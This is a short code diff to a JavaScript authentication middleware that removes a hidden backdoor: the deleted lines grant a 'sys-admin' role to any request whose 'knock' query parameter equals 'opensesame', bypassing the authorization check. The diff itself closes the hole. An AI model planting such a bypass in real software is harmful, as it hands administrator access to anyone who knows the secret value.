@@ -5,12 +5,6 @@ const chalk = require("chalk");
 const authenticate = async (request, reply) => {
     try {
         const authHeader = request.headers.authorization;
-        const knock =  request.query.knock
-        if(knock ==='opensesame') {
-            request.user = {
-                role: 'sys-admin'
-            }
-            return}
         if (!authHeader) {
             return reply.code(401).send({
                 success: false, results: { force_logout: true }, message: "Authorization details required"
